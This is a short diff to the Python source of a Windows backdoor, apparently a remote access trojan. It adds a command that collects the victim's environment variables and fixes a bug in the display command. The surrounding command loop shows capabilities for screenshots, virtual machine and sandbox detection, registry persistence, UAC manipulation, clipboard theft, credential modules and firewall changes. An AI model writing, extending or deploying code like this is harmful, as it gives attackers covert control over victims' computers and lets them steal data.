@@ -15,6 +15,7 @@ from lib.win_creds import *
 from lib.RDP import *
 from lib.UAC import *
 from lib.display import *
+from lib.env import get_env
 
 
 # main backdoor class and functions #################################################################
@@ -93,6 +94,8 @@ class Backdoor:
                 os.remove('monitor-1.png')
             elif cmd[0] == "sysinfo":
                 result = sysinfo()
+            elif cmd[0] == "getenv":
+                result = get_env()
             elif cmd[0] == "checkvm":
                 result = str(detectSandboxie()) + "\n" + str(detectVM())
             elif cmd[0] == "persist_reg":
@@ -102,7 +105,7 @@ class Backdoor:
             elif cmd[0] == "uac":
                 result = uac(cmd[1])
             elif cmd[0] == "display":
-                result == display(cmd[1])
+                result = display(cmd[1])
             elif cmd[0] == "clip":
                 result = clipboard()
             elif cmd[0] == 'fw' and len(cmd) == 4:
